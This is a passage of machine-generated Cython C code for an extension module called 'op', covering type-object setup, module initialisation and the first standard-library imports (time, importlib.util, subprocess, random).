(PyObject*)__pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct_3_genexpr[--__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_3_genexpr];\n    memset(o, 0, sizeof(struct __pyx_obj_2op___pyx_scope_struct_3_genexpr));\n    (void) PyObject_INIT(o, t);\n  } else\n  #endif\n  {\n    o = (*t->tp_alloc)(t, 0);\n    if (unlikely(!o)) return 0;\n  }\n  #endif\n  return o;\n}\n\nstatic void __pyx_tp_dealloc_2op___pyx_scope_struct_3_genexpr(PyObject *o) {\n  #if CYTHON_USE_TP_FINALIZE\n  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {\n    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_2op___pyx_scope_struct_3_genexpr) {\n      if (PyObject_CallFinalizerFromDealloc(o)) return;\n    }\n  }\n  #endif\n  #if CYTHON_USE_FREELISTS\n  if (((int)(__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_3_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_2op___pyx_scope_struct_3_genexpr)))) {\n    __pyx_mstate_global->__pyx_freelist_2op___pyx_scope_struct_3_genexpr[__pyx_mstate_global->__pyx_freecount_2op___pyx_scope_struct_3_genexpr++] = ((struct __pyx_obj_2op___pyx_scope_struct_3_genexpr *)o);\n  } else\n  #endif\n  {\n    #if CYTHON_USE_TYPE_SLOTS\n    (*Py_TYPE(o)->tp_free)(o);\n    #else\n    {\n      freefunc tp_free = (freefunc)PyType_GetSlot(Py_TYPE(o), Py_tp_free);\n      if (tp_free) tp_free(o);\n    }\n    #endif\n  }\n}\n#if CYTHON_USE_TYPE_SPECS\nstatic PyType_Slot __pyx_type_2op___pyx_scope_struct_3_genexpr_slots[] = {\n  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_2op___pyx_scope_struct_3_genexpr},\n  {Py_tp_new, (void *)__pyx_tp_new_2op___pyx_scope_struct_3_genexpr},\n  {0, 0},\n};\nstatic PyType_Spec __pyx_type_2op___pyx_scope_struct_3_genexpr_spec = {\n  "op.__pyx_scope_struct_3_genexpr",\n  sizeof(struct __pyx_obj_2op___pyx_scope_struct_3_genexpr),\n  0,\n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,\n  __pyx_type_2op___pyx_scope_struct_3_genexpr_slots,\n};\n#else\n\nstatic PyTypeObject __pyx_type_2op___pyx_scope_struct_3_genexpr = {\n  PyVarObject_HEAD_INIT(0, 0)\n  "op.""__pyx_scope_struct_3_genexpr", \n  sizeof(struct __pyx_obj_2op___pyx_scope_struct_3_genexpr), \n  0, \n  __pyx_tp_dealloc_2op___pyx_scope_struct_3_genexpr, \n  #if PY_VERSION_HEX < 0x030800b4\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b4\n  0, \n  #endif\n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if !CYTHON_USE_TYPE_SPECS\n  0, \n  #endif\n  0, \n  0, \n  __pyx_tp_new_2op___pyx_scope_struct_3_genexpr, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  0, \n  #if CYTHON_USE_TP_FINALIZE\n  0, \n  #else\n  NULL, \n  #endif\n  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)\n  0, \n  #endif\n  #if __PYX_NEED_TP_PRINT_SLOT == 1\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030C0000\n  0, \n  #endif\n  #if PY_VERSION_HEX >= 0x030d00A4\n  0, \n  #endif\n  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000\n  0, \n  #endif\n};\n#endif\n\nstatic PyMethodDef __pyx_methods[] = {\n  {0, 0, 0, 0}\n};\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void); \nstatic CYTHON_SMALL_CODE int __Pyx_InitConstants(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(__pyx_mstatetype *__pyx_mstate); \nstatic CYTHON_SMALL_CODE int __Pyx_CreateCodeObjects(__pyx_mstatetype *__pyx_mstate); \n\n\nstatic int __Pyx_modinit_global_init_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_export_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_export_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_init_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);\n  \n  #if CYTHON_USE_TYPE_SPECS\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_2op___pyx_scope_struct__genexpr_spec, NULL); if (unlikely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr)) __PYX_ERR(0, 113, __pyx_L1_error)\n  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_2op___pyx_scope_struct__genexpr_spec, __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr) < (0)) __PYX_ERR(0, 113, __pyx_L1_error)\n  #else\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr = &__pyx_type_2op___pyx_scope_struct__genexpr;\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  #endif\n  #if !CYTHON_USE_TYPE_SPECS\n  if (__Pyx_PyType_Ready(__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr) < (0)) __PYX_ERR(0, 113, __pyx_L1_error)\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr->tp_dictoffset && __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr->tp_getattro == PyObject_GenericGetAttr)) {\n    __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct__genexpr->tp_getattro = PyObject_GenericGetAttr;\n  }\n  #endif\n  #if CYTHON_USE_TYPE_SPECS\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_2op___pyx_scope_struct_1_genexpr_spec, NULL); if (unlikely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr)) __PYX_ERR(0, 114, __pyx_L1_error)\n  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_2op___pyx_scope_struct_1_genexpr_spec, __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr) < (0)) __PYX_ERR(0, 114, __pyx_L1_error)\n  #else\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr = &__pyx_type_2op___pyx_scope_struct_1_genexpr;\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  #endif\n  #if !CYTHON_USE_TYPE_SPECS\n  if (__Pyx_PyType_Ready(__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr) < (0)) __PYX_ERR(0, 114, __pyx_L1_error)\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr->tp_dictoffset && __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr->tp_getattro == PyObject_GenericGetAttr)) {\n    __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_1_genexpr->tp_getattro = PyObject_GenericGetAttr;\n  }\n  #endif\n  #if CYTHON_USE_TYPE_SPECS\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_2op___pyx_scope_struct_2_genexpr_spec, NULL); if (unlikely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr)) __PYX_ERR(0, 115, __pyx_L1_error)\n  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_2op___pyx_scope_struct_2_genexpr_spec, __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr) < (0)) __PYX_ERR(0, 115, __pyx_L1_error)\n  #else\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr = &__pyx_type_2op___pyx_scope_struct_2_genexpr;\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  #endif\n  #if !CYTHON_USE_TYPE_SPECS\n  if (__Pyx_PyType_Ready(__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr) < (0)) __PYX_ERR(0, 115, __pyx_L1_error)\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr->tp_dictoffset && __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr->tp_getattro == PyObject_GenericGetAttr)) {\n    __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_2_genexpr->tp_getattro = PyObject_GenericGetAttr;\n  }\n  #endif\n  #if CYTHON_USE_TYPE_SPECS\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_2op___pyx_scope_struct_3_genexpr_spec, NULL); if (unlikely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr)) __PYX_ERR(0, 406, __pyx_L1_error)\n  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_2op___pyx_scope_struct_3_genexpr_spec, __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr) < (0)) __PYX_ERR(0, 406, __pyx_L1_error)\n  #else\n  __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr = &__pyx_type_2op___pyx_scope_struct_3_genexpr;\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  #endif\n  #if !CYTHON_USE_TYPE_SPECS\n  if (__Pyx_PyType_Ready(__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr) < (0)) __PYX_ERR(0, 406, __pyx_L1_error)\n  #endif\n  #if !CYTHON_COMPILING_IN_LIMITED_API\n  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr->tp_dictoffset && __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr->tp_getattro == PyObject_GenericGetAttr)) {\n    __pyx_mstate->__pyx_ptype_2op___pyx_scope_struct_3_genexpr->tp_getattro = PyObject_GenericGetAttr;\n  }\n  #endif\n  __Pyx_RefNannyFinishContext();\n  return 0;\n  __pyx_L1_error:;\n  __Pyx_RefNannyFinishContext();\n  return -1;\n}\n\nstatic int __Pyx_modinit_type_import_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_import_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_import_code(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);\n  \n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\n#if CYTHON_PEP489_MULTI_PHASE_INIT\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); \nstatic int __pyx_pymod_exec_op(PyObject* module); \nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\n  {Py_mod_create, (void*)__pyx_pymod_create},\n  {Py_mod_exec, (void*)__pyx_pymod_exec_op},\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n  {Py_mod_gil, Py_MOD_GIL_USED},\n  #endif\n  #if PY_VERSION_HEX >= 0x030C0000 && CYTHON_USE_MODULE_STATE\n  {Py_mod_multiple_interpreters, Py_MOD_MULTIPLE_INTERPRETERS_NOT_SUPPORTED},\n  #endif\n  {0, NULL}\n};\n#endif\n\n#ifdef __cplusplus\nnamespace {\n  struct PyModuleDef __pyx_moduledef =\n  #else\n  static struct PyModuleDef __pyx_moduledef =\n  #endif\n  {\n      PyModuleDef_HEAD_INIT,\n      "op",\n      0, \n    #if CYTHON_USE_MODULE_STATE\n      sizeof(__pyx_mstatetype), \n    #else\n      (CYTHON_PEP489_MULTI_PHASE_INIT) ? 0 : -1, \n    #endif\n      __pyx_methods ,\n    #if CYTHON_PEP489_MULTI_PHASE_INIT\n      __pyx_moduledef_slots, \n    #else\n      NULL, \n    #endif\n    #if CYTHON_USE_MODULE_STATE\n      __pyx_m_traverse, \n      __pyx_m_clear, \n      NULL \n    #else\n      NULL, \n      NULL, \n      NULL \n    #endif\n  };\n  #ifdef __cplusplus\n} \n#endif\n\n\n#ifndef CYTHON_NO_PYINIT_EXPORT\n  #define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\n#else\n  #ifdef __cplusplus\n  #define __Pyx_PyMODINIT_FUNC extern "C" PyObject *\n  #else\n  #define __Pyx_PyMODINIT_FUNC PyObject *\n  #endif\n#endif\n\n__Pyx_PyMODINIT_FUNC PyInit_op(void) CYTHON_SMALL_CODE; \n__Pyx_PyMODINIT_FUNC PyInit_op(void)\n#if CYTHON_PEP489_MULTI_PHASE_INIT\n{\n  return PyModuleDef_Init(&__pyx_moduledef);\n}\n\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x03090000\nstatic PY_INT64_T __Pyx_GetCurrentInterpreterId(void) {\n    {\n        PyObject *module = PyImport_ImportModule("_interpreters"); // 3.13+ I think\n        if (!module) {\n            PyErr_Clear(); // just try the 3.8-3.12 version\n            module = PyImport_ImportModule("_xxsubinterpreters");\n            if (!module) goto bad;\n        }\n        PyObject *current = PyObject_CallMethod(module, "get_current", NULL);\n        Py_DECREF(module);\n        if (!current) goto bad;\n        if (PyTuple_Check(current)) {\n            PyObject *new_current = PySequence_GetItem(current, 0);\n            Py_DECREF(current);\n            current = new_current;\n            if (!new_current) goto bad;\n        }\n        long long as_c_int = PyLong_AsLongLong(current);\n        Py_DECREF(current);\n        return as_c_int;\n    }\n  bad:\n    PySys_WriteStderr("__Pyx_GetCurrentInterpreterId failed. Try setting the C define CYTHON_PEP489_MULTI_PHASE_INIT=0\\n");\n    return -1;\n}\n#endif\n#if !CYTHON_USE_MODULE_STATE\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\n    static PY_INT64_T main_interpreter_id = -1;\n#if CYTHON_COMPILING_IN_GRAAL\n    PY_INT64_T current_id = PyInterpreterState_GetIDFromThreadState(PyThreadState_Get());\n#elif CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX >= 0x03090000\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyInterpreterState_Get());\n#elif CYTHON_COMPILING_IN_LIMITED_API\n    PY_INT64_T current_id = __Pyx_GetCurrentInterpreterId();\n#else\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\n#endif\n    if (unlikely(current_id == -1)) {\n        return -1;\n    }\n    if (main_interpreter_id == -1) {\n        main_interpreter_id = current_id;\n        return 0;\n    } else if (unlikely(main_interpreter_id != current_id)) {\n        PyErr_SetString(\n            PyExc_ImportError,\n            "Interpreter change detected - this module can only be loaded into one interpreter per process.");\n        return -1;\n    }\n    return 0;\n}\n#endif\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none)\n{\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\n    int result = 0;\n    if (likely(value)) {\n        if (allow_none || value != Py_None) {\n            result = PyDict_SetItemString(moddict, to_name, value);\n        }\n        Py_DECREF(value);\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        PyErr_Clear();\n    } else {\n        result = -1;\n    }\n    return result;\n}\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def) {\n    PyObject *module = NULL, *moddict, *modname;\n    CYTHON_UNUSED_VAR(def);\n    #if !CYTHON_USE_MODULE_STATE\n    if (__Pyx_check_single_interpreter())\n        return NULL;\n    #endif\n    if (__pyx_m)\n        return __Pyx_NewRef(__pyx_m);\n    modname = PyObject_GetAttrString(spec, "name");\n    if (unlikely(!modname)) goto bad;\n    module = PyModule_NewObject(modname);\n    Py_DECREF(modname);\n    if (unlikely(!module)) goto bad;\n    moddict = PyModule_GetDict(module);\n    if (unlikely(!moddict)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;\n    return module;\nbad:\n    Py_XDECREF(module);\n    return NULL;\n}\n\n\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_op(PyObject *__pyx_pyinit_module)\n#endif\n{\n  int stringtab_initialized = 0;\n  #if CYTHON_USE_MODULE_STATE\n  int pystate_addmodule_run = 0;\n  #endif\n  __pyx_mstatetype *__pyx_mstate = NULL;\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  size_t __pyx_t_6;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  PyObject *__pyx_t_9 = NULL;\n  PyObject *__pyx_t_10 = NULL;\n  PyObject *__pyx_t_11 = NULL;\n  PyObject *__pyx_t_12[3];\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  if (__pyx_m) {\n    if (__pyx_m == __pyx_pyinit_module) return 0;\n    PyErr_SetString(PyExc_RuntimeError, "Module \'op\' has already been imported. Re-initialisation is not supported.");\n    return -1;\n  }\n  #else\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\n  #endif\n  \n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __pyx_t_1 = __pyx_pyinit_module;\n  Py_INCREF(__pyx_t_1);\n  #else\n  __pyx_t_1 = PyModule_Create(&__pyx_moduledef); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #if CYTHON_USE_MODULE_STATE\n  {\n    int add_module_result = __Pyx_State_AddModule(__pyx_t_1, &__pyx_moduledef);\n    __pyx_t_1 = 0; \n    if (unlikely((add_module_result < 0))) __PYX_ERR(0, 1, __pyx_L1_error)\n    pystate_addmodule_run = 1;\n  }\n  #else\n  __pyx_m = __pyx_t_1;\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n  PyUnstable_Module_SetGIL(__pyx_m, Py_MOD_GIL_USED);\n  #endif\n  __pyx_mstate = __pyx_mstate_global;\n  CYTHON_UNUSED_VAR(__pyx_t_1);\n  __pyx_mstate->__pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_mstate->__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)\n  Py_INCREF(__pyx_mstate->__pyx_d);\n  __pyx_mstate->__pyx_b = __Pyx_PyImport_AddModuleRef(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_mstate->__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_mstate->__pyx_cython_runtime = __Pyx_PyImport_AddModuleRef("cython_runtime"); if (unlikely(!__pyx_mstate->__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)\n  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_mstate->__pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  #if CYTHON_REFNANNY\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");\nif (!__Pyx_RefNanny) {\n  PyErr_Clear();\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");\n  if (!__Pyx_RefNanny)\n      Py_FatalError("failed to import \'refnanny\' module");\n}\n#endif\n\n__Pyx_RefNannySetupContext("PyInit_op", 0);\n  if (__Pyx_check_binary_version(__PYX_LIMITED_VERSION_HEX, __Pyx_get_runtime_version(), CYTHON_COMPILING_IN_LIMITED_API) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\n  __Pxy_PyFrame_Initialize_Offsets();\n  #endif\n  __pyx_mstate->__pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_mstate->__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_mstate->__pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_mstate->__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_mstate->__pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_mstate->__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  if (__Pyx_InitConstants(__pyx_mstate) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  stringtab_initialized = 1;\n  if (__Pyx_InitGlobals() < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #if 0 || defined(__Pyx_CyFunction_USED) || defined(__Pyx_FusedFunction_USED) || defined(__Pyx_Coroutine_USED) || defined(__Pyx_Generator_USED) || defined(__Pyx_AsyncGen_USED)\n  if (__pyx_CommonTypesMetaclass_init(__pyx_m) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_CyFunction_USED\n  if (__pyx_CyFunction_init(__pyx_m) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  if (__pyx_FusedFunction_init(__pyx_m) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  if (__pyx_Coroutine_init(__pyx_m) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Generator_USED\n  if (__pyx_Generator_init(__pyx_m) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_AsyncGen_USED\n  if (__pyx_AsyncGen_init(__pyx_m) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  \n  if (__pyx_module_is_main_op) {\n    if (PyObject_SetAttr(__pyx_m, __pyx_mstate_global->__pyx_n_u_name_2, __pyx_mstate_global->__pyx_n_u_main) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  }\n  {\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)\n    if (!PyDict_GetItemString(modules, "op")) {\n      if (unlikely((PyDict_SetItemString(modules, "op", __pyx_m) < 0))) __PYX_ERR(0, 1, __pyx_L1_error)\n    }\n  }\n  \n  if (__Pyx_InitCachedBuiltins(__pyx_mstate) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  if (__Pyx_InitCachedConstants(__pyx_mstate) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  if (__Pyx_CreateCodeObjects(__pyx_mstate) < (0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  \n  (void)__Pyx_modinit_global_init_code(__pyx_mstate);\n  (void)__Pyx_modinit_variable_export_code(__pyx_mstate);\n  (void)__Pyx_modinit_function_export_code(__pyx_mstate);\n  if (unlikely((__Pyx_modinit_type_init_code(__pyx_mstate) < 0))) __PYX_ERR(0, 1, __pyx_L1_error)\n  (void)__Pyx_modinit_type_import_code(__pyx_mstate);\n  (void)__Pyx_modinit_variable_import_code(__pyx_mstate);\n  (void)__Pyx_modinit_function_import_code(__pyx_mstate);\n  \n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_time, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_time, __pyx_t_2) < (0)) __PYX_ERR(0, 2, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_importlib_util, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_importlib, __pyx_t_2) < (0)) __PYX_ERR(0, 3, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_subprocess, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_subprocess, __pyx_t_2) < (0)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_randrange); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)\n  